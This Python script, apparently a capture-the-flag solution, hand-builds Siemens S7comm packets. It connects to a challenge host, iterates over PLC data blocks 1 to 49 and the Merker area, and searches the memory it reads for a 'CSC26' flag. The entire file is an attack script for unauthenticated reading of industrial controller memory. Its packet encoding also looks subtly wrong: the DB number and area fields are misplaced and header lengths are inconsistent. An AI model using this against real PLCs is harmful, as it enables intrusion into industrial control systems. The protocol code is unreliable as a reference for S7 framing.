#!/usr/bin/env python3
"""
Siemens S7 PLC Reader - Manual Protocol Implementation
"""

import socket
import struct
import time

HOST = "mnbvcxzqwertyui-csc26.cybersecuritychallenge.al"
PORT = 10023

def send_and_receive(sock, data, description=""):
    """Send data and receive response"""
    if description:
        print(f"\n[*] {description}")
    print(f"[>] Sending: {data.hex()}")
    
    sock.send(data)
    time.sleep(0.2)
    
    try:
        response = sock.recv(4096)
        print(f"[<] Received ({len(response)} bytes): {response.hex()}")
        
        # Try to decode as ASCII
        decoded = response.decode('ascii', errors='ignore')
        if decoded.strip():
            print(f"[*] ASCII: {decoded}")
        
        return response
    except socket.timeout:
        print("[-] Timeout")
        return None

def read_plc():
    """Connect to PLC and read data using S7 protocol"""
    
    print(f"[*] Connecting to {HOST}:{PORT}")
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    
    try:
        sock.connect((HOST, PORT))
        print("[+] Connected!\n")
        
        # Step 1: COTP Connection Request (ISO-on-TCP)
        # TPKT Header (4 bytes) + COTP CR (17 bytes)
        cotp_cr = bytes.fromhex(
            '03 00 00 16'  # TPKT: Version 3, Reserved 0, Length 22
            '11 e0 00 00 00 14 00'  # COTP CR
            'c0 01 0a'  # Source TSAP
            'c1 02 01 00'  # Destination TSAP  
            'c2 02 01 02'  # TPDU size
        )
        
        response = send_and_receive(sock, cotp_cr, "Sending COTP Connection Request")
        
        if not response or len(response) < 7:
            print("[-] Invalid COTP response")
            return None
        
        # Step 2: S7 Setup Communication
        s7_setup = bytes.fromhex(
            '03 00 00 19'  # TPKT Header
            '02 f0 80'  # COTP DT (Data Transfer)
            '32 01 00 00 00 00 00'  # S7 Header
            '08 00 00'  # Parameter
            'f0 00 00 01 00 01 01 e0'  # Setup parameters
        )
        
        response = send_and_receive(sock, s7_setup, "Sending S7 Setup Communication")
        
        if not response:
            print("[-] No S7 setup response")
            return None
        
        # Step 3: Read Data Blocks
        print("\n" + "="*70)
        print("Reading Data Blocks...")
        print("="*70)
        
        for db_number in range(1, 50):
            # S7 Read Request
            # We'll try to read 256 bytes from each DB
            s7_read = bytes.fromhex(
                '03 00 00 1f'  # TPKT Header (length will vary)
                '02 f0 80'  # COTP DT
                '32 01 00 00 00 00 00'  # S7 Header
                '0e 00 00'  # Parameter length
                '04 01'  # Read Var
            )
            
            # Add read item
            read_item = bytes.fromhex(
                '12 0a 10'  # Item spec
                '02'  # Byte/Word/DWord = Byte
            ) + struct.pack('>H', 256) + bytes.fromhex(  # Count = 256 bytes
                f'{db_number:02x} 00 00'  # DB number
                '84 00 00 00 00'  # Area (DB) + Address
            )
            
            s7_read += read_item
            
            # Update length in TPKT header
            s7_read = struct.pack('>H', len(s7_read)).join([s7_read[:2], s7_read[4:]])
            
            response = send_and_receive(sock, s7_read, f"Reading DB{db_number}")
            
            if response and len(response) > 20:
                # Extract data payload (skip headers)
                data = response[18:]  # Skip TPKT + COTP + S7 headers
                
                # Try to find flag
                decoded = data.decode('ascii', errors='ignore')
                
                if 'CSC26' in decoded or 'CSC26' in data.hex():
                    print(f"\n{'='*70}")
                    print(f"[!] POTENTIAL FLAG FOUND IN DB{db_number}!")
                    print(f"{'='*70}")
                    print(f"Raw data: {data[:200]}")
                    print(f"Decoded: {decoded[:200]}")
                    print(f"Hex: {data.hex()[:400]}")
                    
                    # Try to extract the flag
                    if 'CSC26' in decoded:
                        idx = decoded.index('CSC26')
                        flag = decoded[idx:idx+50]
                        print(f"\n[!] FLAG: {flag}")
                        sock.close()
                        return flag
        
        # Try reading Merkers (M area)
        print("\n" + "="*70)
        print("Reading Merkers (M area)...")
        print("="*70)
        
        s7_read_m = bytes.fromhex(
            '03 00 00 1f'
            '02 f0 80'
            '32 01 00 00 00 00 00'
            '0e 00 00'
            '04 01'
            '12 0a 10 02'
        ) + struct.pack('>H', 1024) + bytes.fromhex(
            '83 00 00 00 00'  # Area = Merkers
        )
        
        response = send_and_receive(sock, s7_read_m, "Reading Merkers")
        
        if response and len(response) > 20:
            data = response[18:]
            decoded = data.decode('ascii', errors='ignore')
            
            if 'CSC26' in decoded:
                print(f"\n[!] FLAG FOUND IN MERKERS: {decoded}")
                sock.close()
                return decoded
        
        sock.close()
        
    except Exception as e:
        print(f"\n[-] Error: {e}")
        import traceback
        traceback.print_exc()
    
    return None

if __name__ == "__main__":
    print("="*70)
    print("Siemens S7 PLC Reader")
    print("="*70)
    
    flag = read_plc()
    
    if flag:
        print(f"\n{'='*70}")
        print(f"SUCCESS! Flag found: {flag}")
        print(f"{'='*70}")
    else:
        print("\n[-] Flag not found")
